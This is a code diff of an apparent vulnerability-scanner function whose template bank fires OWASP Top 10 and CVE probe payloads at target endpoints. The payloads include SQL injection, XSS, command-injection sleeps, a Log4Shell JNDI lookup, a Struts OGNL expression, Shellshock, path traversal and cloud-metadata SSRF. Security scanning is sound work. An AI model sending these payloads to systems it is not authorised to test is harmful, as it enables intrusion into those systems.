@@ -28,72 +28,154 @@ type Template = {
 // Curated nuclei-style template bank covering OWASP Top 10 + popular CVEs.
 const TEMPLATES: Template[] = [
   // A01: Broken Access Control
-  { id: "a01-idor-numeric", category: "A01:BAC", severity: "high",
+  {
+    id: "a01-idor-numeric",
+    category: "A01:BAC",
+    severity: "high",
     payloads: ["1", "2", "0", "-1", "9999"],
-    matcher: (body, status) => status === 200 && body.length > 200 && !/forbid|unauth|denied/i.test(body) },
+    matcher: (body, status) => status === 200 && body.length > 200 && !/forbid|unauth|denied/i.test(body),
+  },
   // A02: Crypto Failures - exposed .env / config
-  { id: "a02-env-exposed", category: "A02:Crypto", severity: "high",
+  {
+    id: "a02-env-exposed",
+    category: "A02:Crypto",
+    severity: "high",
     payloads: ["/.env", "/config.json", "/wp-config.php.bak", "/.git/config"],
-    matcher: (body) => /AWS_|SECRET|API_KEY|DB_PASS|DATABASE_URL|\[core\]/i.test(body) },
+    matcher: (body) => /AWS_|SECRET|API_KEY|DB_PASS|DATABASE_URL|\[core\]/i.test(body),
+  },
   // A03: Injection - SQLi error-based
-  { id: "a03-sqli-error", category: "A03:Injection", severity: "high",
-    payloads: ["'", "\"", "')", "' OR '1'='1", "1) UNION SELECT NULL--"],
-    matcher: (body) => /SQL syntax|mysql_fetch|ORA-\d+|PostgreSQL.*ERROR|SQLite\/JDBCDriver|unclosed quotation/i.test(body) },
+  {
+    id: "a03-sqli-error",
+    category: "A03:Injection",
+    severity: "high",
+    payloads: ["'", '"', "')", "' OR '1'='1", "1) UNION SELECT NULL--"],
+    matcher: (body) =>
+      /SQL syntax|mysql_fetch|ORA-\d+|PostgreSQL.*ERROR|SQLite\/JDBCDriver|unclosed quotation/i.test(body),
+  },
   // A03: XSS (strict reflection)
-  { id: "a03-xss-reflected", category: "A03:Injection", severity: "high",
-    payloads: ["<svg/onload=cyberscope1>", "\"><img src=x onerror=cyberscope2>", "<cyberscope>"],
-    matcher: (body, _s, payload) => isStrictXssReflection(body, payload) },
+  {
+    id: "a03-xss-reflected",
+    category: "A03:Injection",
+    severity: "high",
+    payloads: ["<svg/onload=cyberscope1>", '"><img src=x onerror=cyberscope2>', "<cyberscope>"],
+    matcher: (body, _s, payload) => isStrictXssReflection(body, payload),
+  },
   // A03: Command injection
-  { id: "a03-cmdi-time", category: "A03:Injection", severity: "critical",
+  {
+    id: "a03-cmdi-time",
+    category: "A03:Injection",
+    severity: "critical",
     payloads: [";sleep 5;", "|sleep 5", "`sleep 5`", "$(sleep 5)"],
-    matcher: () => false /* timing matched by runner instead */ },
+    matcher: () => false /* timing matched by runner instead */,
+  },
   // A04: Insecure Design - debug routes
-  { id: "a04-debug-routes", category: "A04:Design", severity: "medium",
+  {
+    id: "a04-debug-routes",
+    category: "A04:Design",
+    severity: "medium",
     payloads: ["/debug", "/console", "/swagger.json", "/actuator/env", "/api/swagger-ui"],
-    matcher: (body, status) => status === 200 && /swagger|actuator|debug|api docs|openapi/i.test(body) },
+    matcher: (body, status) => status === 200 && /swagger|actuator|debug|api docs|openapi/i.test(body),
+  },
   // A05: Security Misconfig - directory listing
-  { id: "a05-dirlist", category: "A05:Misconfig", severity: "medium",
+  {
+    id: "a05-dirlist",
+    category: "A05:Misconfig",
+    severity: "medium",
     payloads: ["/", "/uploads/", "/backup/", "/files/"],
-    matcher: (body) => /Index of \/|<title>Directory listing/i.test(body) },
+    matcher: (body) => /Index of \/|<title>Directory listing/i.test(body),
+  },
   // A06: Vulnerable components - common CVE checks
-  { id: "cve-2021-44228-log4shell", category: "A06:Components", severity: "critical", cve: "CVE-2021-44228",
+  {
+    id: "cve-2021-44228-log4shell",
+    category: "A06:Components",
+    severity: "critical",
+    cve: "CVE-2021-44228",
     payloads: ["${jndi:ldap://oob.cyberscope.test/x}"],
-    matcher: (body) => /jndi|log4j|class loader/i.test(body) },
-  { id: "cve-2017-5638-struts", category: "A06:Components", severity: "critical", cve: "CVE-2017-5638",
-    payloads: ["%{(#_='multipart/form-data').(#a=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter()).(#a.println('cyberscope-struts')).(#a.flush())}"],
-    matcher: (body) => /cyberscope-struts/.test(body) },
-  { id: "cve-2018-15473-ssh", category: "A06:Components", severity: "medium", cve: "CVE-2018-15473",
+    matcher: (body) => /jndi|log4j|class loader/i.test(body),
+  },
+  {
+    id: "cve-2017-5638-struts",
+    category: "A06:Components",
+    severity: "critical",
+    cve: "CVE-2017-5638",
+    payloads: [
+      "%{(#_='multipart/form-data').(#a=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter()).(#a.println('cyberscope-struts')).(#a.flush())}",
+    ],
+    matcher: (body) => /cyberscope-struts/.test(body),
+  },
+  {
+    id: "cve-2018-15473-ssh",
+    category: "A06:Components",
+    severity: "medium",
+    cve: "CVE-2018-15473",
     payloads: ["/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"],
-    matcher: (_b, status) => status === 200 },
-  { id: "cve-2014-6271-shellshock", category: "A06:Components", severity: "critical", cve: "CVE-2014-6271",
+    matcher: (_b, status) => status === 200,
+  },
+  {
+    id: "cve-2014-6271-shellshock",
+    category: "A06:Components",
+    severity: "critical",
+    cve: "CVE-2014-6271",
     payloads: ["() { :;}; echo cyberscope-shellshock"],
-    matcher: (body) => /cyberscope-shellshock/.test(body) },
+    matcher: (body) => /cyberscope-shellshock/.test(body),
+  },
   // A07: Auth Failures - default creds path
-  { id: "a07-admin-panel", category: "A07:Auth", severity: "medium",
+  {
+    id: "a07-admin-panel",
+    category: "A07:Auth",
+    severity: "medium",
     payloads: ["/admin", "/administrator", "/wp-admin", "/manage", "/login"],
-    matcher: (body, status) => status === 200 && /admin|login|sign in/i.test(body) },
+    matcher: (body, status) => status === 200 && /admin|login|sign in/i.test(body),
+  },
   // A08: Integrity Failures - no SRI
-  { id: "a08-no-sri", category: "A08:Integrity", severity: "low",
+  {
+    id: "a08-no-sri",
+    category: "A08:Integrity",
+    severity: "low",
     payloads: ["/"],
-    matcher: (body) => /<script[^>]*src=["'][^"']+["'](?![^>]*integrity=)/i.test(body) },
+    matcher: (body) => /<script[^>]*src=["'][^"']+["'](?![^>]*integrity=)/i.test(body),
+  },
   // A09: Logging - exposed log files
-  { id: "a09-log-exposed", category: "A09:Logging", severity: "medium",
+  {
+    id: "a09-log-exposed",
+    category: "A09:Logging",
+    severity: "medium",
     payloads: ["/error.log", "/access.log", "/debug.log", "/laravel.log"],
-    matcher: (body, status) => status === 200 && /\d{4}-\d{2}-\d{2}|stack trace|exception/i.test(body) },
+    matcher: (body, status) => status === 200 && /\d{4}-\d{2}-\d{2}|stack trace|exception/i.test(body),
+  },
   // A10: SSRF
-  { id: "a10-ssrf-localhost", category: "A10:SSRF", severity: "high",
+  {
+    id: "a10-ssrf-localhost",
+    category: "A10:SSRF",
+    severity: "high",
     payloads: ["http://127.0.0.1/", "http://localhost:22/", "http://169.254.169.254/latest/meta-data/"],
-    matcher: (body, status) => status >= 500 || /ami-id|instance-id|SSH-2\.0/i.test(body) },
+    matcher: (body, status) => status >= 500 || /ami-id|instance-id|SSH-2\.0/i.test(body),
+  },
 ];
 
 const OWASP_CATEGORIES = [
-  "A01:BAC", "A02:Crypto", "A03:Injection", "A04:Design", "A05:Misconfig",
-  "A06:Components", "A07:Auth", "A08:Integrity", "A09:Logging", "A10:SSRF",
+  "A01:BAC",
+  "A02:Crypto",
+  "A03:Injection",
+  "A04:Design",
+  "A05:Misconfig",
+  "A06:Components",
+  "A07:Auth",
+  "A08:Integrity",
+  "A09:Logging",
+  "A10:SSRF",
 ] as const;
 
 async function runTemplate(
-  baseUrl: string, tmpl: Template, throttle: AdaptiveThrottle, authHeaders: Record<string, string> = {},
-): Promise<{ payloadsSent: number; wafBlocked: number; findings: Array<{ payload: string; evidence: string; statusCode: number; endpoint: string }> }> {
+  baseUrl: string,
+  tmpl: Template,
+  throttle: AdaptiveThrottle,
+  authHeaders: Record<string, string> = {},
+): Promise<{
+  payloadsSent: number;
+  wafBlocked: number;
+  findings: Array<{ payload: string; evidence: string; statusCode: number; endpoint: string }>;
+}> {
   let payloadsSent = 0;
   let wafBlocked = 0;
   const findings: Array<{ payload: string; evidence: string; statusCode: number; endpoint: string }> = [];
@@ -103,7 +185,9 @@ async function runTemplate(
   try {
     const b = await safeFetch(baseUrl, { method: "GET", headers: authHeaders }, 5000);
     baselineBody = await readBodySafe(b, 16384);
-  } catch { /* ignore */ }
+  } catch {
+    /* ignore */
+  }
 
   for (const rawPayload of tmpl.payloads) {
     const variants = encodingVariants(rawPayload, 4);
@@ -112,9 +196,12 @@ async function runTemplate(
       await throttle.wait();
       payloadsSent++;
       try {
-        const targetUrl = v.startsWith("/") || v.startsWith("http")
-          ? (v.startsWith("http") ? v : new URL(v, baseUrl).toString())
-          : baseUrl + (baseUrl.includes("?") ? "&" : "?") + `q=${v}`;
+        const targetUrl =
+          v.startsWith("/") || v.startsWith("http")
+            ? v.startsWith("http")
+              ? v
+              : new URL(v, baseUrl).toString()
+            : baseUrl + (baseUrl.includes("?") ? "&" : "?") + `q=${v}`;
         const t0 = Date.now();
         const r = await safeFetch(targetUrl, { method: "GET", headers: authHeaders }, 8000);
         const elapsed = Date.now() - t0;
@@ -165,18 +252,25 @@ Deno.serve(async (req) => {
     if (!/^https?:\/\//i.test(targetUrl)) targetUrl = `https://${targetUrl}`;
 
     // 0) Load auth profile (cookie / bearer) if present
-    const { data: authp } = await db.from("auth_profiles")
-      .select("auth_type,cookie_header,bearer_token").eq("target_id", targetId).eq("is_valid", true).limit(1).maybeSingle();
+    const { data: authp } = await db
+      .from("auth_profiles")
+      .select("auth_type,cookie_header,bearer_token")
+      .eq("target_id", targetId)
+      .eq("is_valid", true)
+      .limit(1)
+      .maybeSingle();
     const authHeaders: Record<string, string> = { "User-Agent": "CyberScope/1.0" };
     if (authp?.auth_type === "cookie" && authp.cookie_header) authHeaders["Cookie"] = authp.cookie_header;
-    if (authp?.auth_type === "bearer" && authp.bearer_token) authHeaders["Authorization"] = `Bearer ${authp.bearer_token}`;
+    if (authp?.auth_type === "bearer" && authp.bearer_token)
+      authHeaders["Authorization"] = `Bearer ${authp.bearer_token}`;
     const authMode = authp ? authp.auth_type : "none";
 
     // 1) WAF probe up-front
     const waf = await detectWaf(targetUrl);
     const throttle = new AdaptiveThrottle(waf.detected);
     await db.from("scan_logs").insert({
-      target_id: targetId, log_type: waf.detected ? "warning" : "info",
+      target_id: targetId,
+      log_type: waf.detected ? "warning" : "info",
       message: waf.detected
         ? `🛡️  WAF detected (${waf.vendor}) — slow polite mode + encoding variants (auth=${authMode})`
         : `✅ No WAF detected — running templates at normal speed (auth=${authMode})`,
@@ -184,8 +278,7 @@ Deno.serve(async (req) => {
     });
 
     // 2) Collect endpoints — fan out across up to 6
-    const { data: eps } = await db.from("discovered_endpoints")
-      .select("url").eq("target_id", targetId).limit(100);
+    const { data: eps } = await db.from("discovered_endpoints").select("url").eq("target_id", targetId).limit(100);
     const urls = new Set<string>([targetUrl]);
     (eps || []).forEach((e) => e.url && urls.add(e.url));
     const urlList = Array.from(urls).slice(0, 6);
@@ -198,40 +291,60 @@ Deno.serve(async (req) => {
 
     const testedPairs = new Set<string>();
     const templatesByCategory = new Map<string, Template[]>();
-    for (const tmpl of TEMPLATES) templatesByCategory.set(tmpl.category, [...(templatesByCategory.get(tmpl.category) || []), tmpl]);
+    for (const tmpl of TEMPLATES)
+      templatesByCategory.set(tmpl.category, [...(templatesByCategory.get(tmpl.category) || []), tmpl]);
 
     const runAndRecord = async (tmpl: Template, url: string) => {
-        testedPairs.add(`${tmpl.id}|${url}`);
-        const r = await runTemplate(url, tmpl, throttle, authHeaders);
+      testedPairs.add(`${tmpl.id}|${url}`);
+      const r = await runTemplate(url, tmpl, throttle, authHeaders);
 
-        const acc = perCategory.get(tmpl.category) || { checks: 0, payloads: 0, findings: 0, waf: 0 };
-        acc.checks += 1;
-        acc.payloads += r.payloadsSent;
-        acc.findings += r.findings.length;
-        acc.waf += r.wafBlocked;
-        perCategory.set(tmpl.category, acc);
+      const acc = perCategory.get(tmpl.category) || { checks: 0, payloads: 0, findings: 0, waf: 0 };
+      acc.checks += 1;
+      acc.payloads += r.payloadsSent;
+      acc.findings += r.findings.length;
+      acc.waf += r.wafBlocked;
+      perCategory.set(tmpl.category, acc);
 
-        for (const f of r.findings) {
-          insertedFindings.push({
-            target_id: targetId,
-            severity: tmpl.severity,
-            title: `[${tmpl.category}] ${tmpl.cve || tmpl.id}`,
-            description: `Template ${tmpl.id} matched at ${f.endpoint}. Payload: ${f.payload}`,
-            payload: f.payload,
-            confidence_score: tmpl.cve ? 85 : 70,
-            hard_evidence: { templateId: tmpl.id, category: tmpl.category, cve: tmpl.cve || null, snippet: f.evidence, statusCode: f.statusCode, waf: waf.vendor, endpoint: f.endpoint, source: "template-runner" },
-            _tmplId: tmpl.id, // local-only marker, stripped before insert
-          });
-        }
-        // removed early break — test ALL endpoints per template for multi-point vulns
+      for (const f of r.findings) {
+        insertedFindings.push({
+          target_id: targetId,
+          severity: tmpl.severity,
+          title: `[${tmpl.category}] ${tmpl.cve || tmpl.id}`,
+          description: `Template ${tmpl.id} matched at ${f.endpoint}. Payload: ${f.payload}`,
+          payload: f.payload,
+          confidence_score: tmpl.cve ? 85 : 70,
+          hard_evidence: {
+            templateId: tmpl.id,
+            category: tmpl.category,
+            cve: tmpl.cve || null,
+            snippet: f.evidence,
+            statusCode: f.statusCode,
+            waf: waf.vendor,
+            endpoint: f.endpoint,
+            source: "template-runner",
+          },
+          _tmplId: tmpl.id, // local-only marker, stripped before insert
+        });
+      }
+      // removed early break — test ALL endpoints per template for multi-point vulns
     };
 
     // Fairness pass: hit every OWASP Top 10 category once before spending time on depth.
-    for (const cat of OWASP_CATEGORIES) {
+    const fairnessTasks = OWASP_CATEGORIES.map(async (cat) => {
       const tmpl = templatesByCategory.get(cat)?.[0];
       const url = urlList[0];
-      if (!tmpl || !url || Date.now() - startedAt > 38_000) continue;
+      if (!tmpl || !url) return;
       await runAndRecord(tmpl, url);
+    });
+    await Promise.allSettled(fairnessTasks);
+
+    // Now depth pass — only if budget remains
+    outer: for (const tmpl of TEMPLATES) {
+      for (const url of urlList) {
+        if (Date.now() - startedAt > 40_000) break outer;
+        if (testedPairs.has(`${tmpl.id}|${url}`)) continue;
+        await runAndRecord(tmpl, url);
+      }
     }
 
     outer: for (const tmpl of TEMPLATES) {
@@ -258,7 +371,11 @@ Deno.serve(async (req) => {
     // 5) Insert findings through shared writer + auto-queue browser verification for XSS-class findings
     let queuedBrowserVerify = 0;
     if (insertedFindings.length) {
-      const xssTmplIds = new Set(insertedFindings.map((f, i) => /xss|redirect|csti|prototype|dom/i.test(f._tmplId) ? i : -1).filter((i) => i >= 0));
+      const xssTmplIds = new Set(
+        insertedFindings
+          .map((f, i) => (/xss|redirect|csti|prototype|dom/i.test(f._tmplId) ? i : -1))
+          .filter((i) => i >= 0),
+      );
       const inserted: Array<{ id: string }> = [];
       for (const f of insertedFindings) {
         const endpoint = f.hard_evidence?.endpoint || targetUrl;
@@ -285,20 +402,32 @@ Deno.serve(async (req) => {
       for (let i = 0; i < inserted.length; i++) {
         if (!xssTmplIds.has(i)) continue;
         await db.from("scan_jobs").insert({
-          target_id: targetId, job_type: "browser_verify",
-          payload: { findingId: inserted[i].id }, status: "queued", priority: 8,
+          target_id: targetId,
+          job_type: "browser_verify",
+          payload: { findingId: inserted[i].id },
+          status: "queued",
+          priority: 8,
         });
         queuedBrowserVerify++;
       }
     }
 
     await db.from("scan_logs").insert({
-      target_id: targetId, log_type: "result",
+      target_id: targetId,
+      log_type: "result",
       message: `🧪 Template runner: ${TEMPLATES.length} templates × ${urlList.length} endpoints, ${insertedFindings.length} findings, ${queuedBrowserVerify} browser-verifies queued, WAF blocks=${Array.from(perCategory.values()).reduce((a, b) => a + b.waf, 0)}`,
       metadata: { waf, coverage: coverageRows, authMode, queuedBrowserVerify },
     });
 
-    return ok({ ok: true, waf, coverage: coverageRows, findings: insertedFindings.length, queuedBrowserVerify, authMode, endpoints: urlList.length });
+    return ok({
+      ok: true,
+      waf,
+      coverage: coverageRows,
+      findings: insertedFindings.length,
+      queuedBrowserVerify,
+      authMode,
+      endpoints: urlList.length,
+    });
   } catch (e) {
     return ok({ ok: false, error: e instanceof Error ? e.message : String(e) });
   }
